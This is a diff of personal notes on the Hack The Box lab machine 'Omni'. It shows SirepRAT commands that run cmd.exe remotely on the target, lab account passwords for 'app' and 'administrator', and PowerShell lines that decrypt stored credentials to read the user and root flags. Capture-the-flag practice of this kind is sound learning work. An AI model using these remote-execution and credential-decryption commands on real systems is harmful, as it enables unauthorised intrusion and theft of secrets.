@@ -51,8 +51,7 @@ I was hinted: https://github.com/SafeBreach-Labs/SirepRAT.git
   python SirepRAT.py omni.htb LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c ls"
 
   - user the --v flag...
-kali@kali:~/snack/omni/SirepRAT$ python SirepRAT.py omni.htb LaunchCommandWithOutput --return_output --cmd "C:\\Windows\\System32\\cmd.exe" --args " /c
- wmic logicaldisk get name" --v
+kali@kali:~/snack/omni/SirepRAT$ python SirepRAT.py omni.htb LaunchCommandWithOutput --return_output --cmd "C:\\Windows\\System32\\cmd.exe" --args " /c wmic logicaldisk get name" --v
 ---------
 Name                          = C:
 Name                          = D:
@@ -82,9 +81,22 @@ e4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e7
   </Obj>
 </Objs>
 
+https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx
+
+has creds PS C:\program files\windowspowershell\modules\packagemanagement> cat r.bat
+log in at 8080
+  net user app mesh5143
+run command for shell
+  $credential = Import-CliXml -Path  U:\users\app\user.txt
+  $credential.GetNetworkCredential().Password
+
+
 ################################################################################
 ROOT
 ################################################################################
+net user administrator _1nt3rn37ofTh1nGz
+$credential = Import-CliXml -Path  U:\users\administrator\root.txt
+$credential.GetNetworkCredential().Password
 kali@kali:~/snack/omni/SirepRAT$ python SirepRAT.py omni.htb LaunchCommandWithOutput --return_output --cmd "C:\\Windows\\System32\\cmd.exe" --args " /c
  type U:\\users\\administrator\\root.txt" --v
 ---------
